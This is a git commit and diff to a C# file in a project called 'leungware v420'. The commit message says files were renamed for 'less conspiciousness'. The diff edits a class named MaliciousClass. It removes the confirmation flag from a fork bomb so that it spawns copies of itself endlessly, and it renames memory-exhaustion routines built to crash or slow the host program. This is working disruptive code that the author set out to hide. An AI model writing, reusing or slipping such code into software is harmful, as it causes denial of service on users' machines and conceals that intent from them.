4dbae9dc935ac18f50f5d4b1249fd6fd1d8e8b35
Randy Zhu <randyzhu@protonmail.com>
2020-10-04 18:07:59 -0700

    renamed files for less conspiciousness tbh a few refactors, and documentation.

--- leungware v420/Utillib.cs
+++ leungware v420/Utillib.cs
@@ -8,21 +8,24 @@ using System.Windows.Forms;
 // maybe explain what half of these things are
 namespace leungware_v420
 {
+    /*
+     * A class of malicious methods, including a forkbomb, which creates duplicates of itself, SlowDown(), which just randomly fills up the RAM of the process.
+     */
     public class MaliciousClass
     {
         // ReSharper disable once MemberCanBeMadeStatic.Global
-        public void ForkBomb(bool confirmation)
+        public void ForkBomb()
         {
             // Essentially makes new versions of this process repeatedly, with NO END
             // use with caution!
             // ReSharper disable once LoopVariableIsNeverChangedInsideLoop
-            while (confirmation)
+            while (true)
             {
                 Process.Start(Assembly.GetExecutingAssembly().Location);
             }
         }
 
-        private static IEnumerable<double> GetData()
+        private static IEnumerable<double> SlowDown()
         {
             // Generates a new random number.
             // ReSharper disable once HeapView.ObjectAllocation.Evident
@@ -30,7 +33,7 @@ namespace leungware_v420
             // Creates a new C# List<double> to fuck with.
             // ReSharper disable once HeapView.ObjectAllocation.Evident
             List<double> valuesDoubles = new List<double>();
-            // Now, it continuously to the above List<double>, until it reaches the max value for a 64bit signed integer.
+            // Now, it continuously adds to the above List<double>, until it reaches the max value for a 64bit signed integer.
             for (long i = 0; i < long.MaxValue; i++)
             {
                 // Uses double to really fuck with the app.
@@ -40,7 +43,7 @@ namespace leungware_v420
             return valuesDoubles.ToArray();
         }
 
-        // A function that uses the above GetData() function to crash the app, causing a System.OutOfMemoryException.
+        // A function that uses the above SlowDown() function to crash the app, causing a System.OutOfMemoryException.
         // ReSharper disable once MemberCanBeMadeStatic.Global
         public void CrashProgram()
         {
@@ -48,7 +51,7 @@ namespace leungware_v420
             try
             {
                 // Creates a new IEnumerable (which basically is a List<> but fancier, and then attempts to fit that huge list into Malloc(), which fucks the program.
-                IEnumerable<double> values = GetData();
+                IEnumerable<double> values = SlowDown();
             }
             // Displays an error message! 
             catch (Exception e)
@@ -56,6 +59,7 @@ namespace leungware_v420
                 MessageBox.Show(
                     // ReSharper disable once LocalizableElement
                     $"An error has occured, maybe try changing your settings?: {Environment.NewLine} {Environment.NewLine} {e}");
+                // throwing
                 throw;
             }
         }
@@ -66,10 +70,12 @@ namespace leungware_v420
             // Repeatedly makes a List<double> to really slow the app.
             for (long i = 0; i < int.MaxValue / dividend; i++)
             {
-                // L I S T  T H I S  S T U F F 
+                // Create a stupid nested list repeatedly.
+                // i like miranda btw
                 // ReSharper disable once HeapView.ObjectAllocation.Evident
-                List<double> strList = new List<double> {double.MaxValue};
-            } 
+                List<double> strList = new List<double> { double.MaxValue };
+                Console.WriteLine(strList);
+            }
         }
     }
 }
